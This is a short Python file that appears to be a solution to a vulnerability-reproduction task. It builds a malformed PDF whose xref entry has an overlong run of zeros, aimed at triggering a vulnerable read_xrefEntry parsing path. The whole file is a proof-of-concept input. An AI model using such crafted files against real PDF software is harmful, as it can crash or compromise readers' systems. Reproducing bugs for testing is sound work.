import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a minimal PDF that directs startxref to the beginning of an overlong xref entry.
        # Overlong zeros in the first field should trigger the vulnerable read_xrefEntry path.
        header = b"%PDF-1.3\n"
        xref_offset = len(header)

        # Overlong zeros for f1 (offset) and minimal f2 (generation)
        f1_zeros = b"0" * 40  # sufficiently overlong to trigger the issue
        f2_zeros = b"0" * 5   # standard gen, keep simple

        xref = b"xref\n0 1\n" + f1_zeros + b" " + f2_zeros + b" n\n"
        # Keep trailer minimal; not required for triggering but benign
        trailer = b"trailer\n<<>>\n"
        startxref = b"startxref\n" + str(xref_offset).encode("ascii") + b"\n%%EOF\n"

        return header + xref + trailer + startxref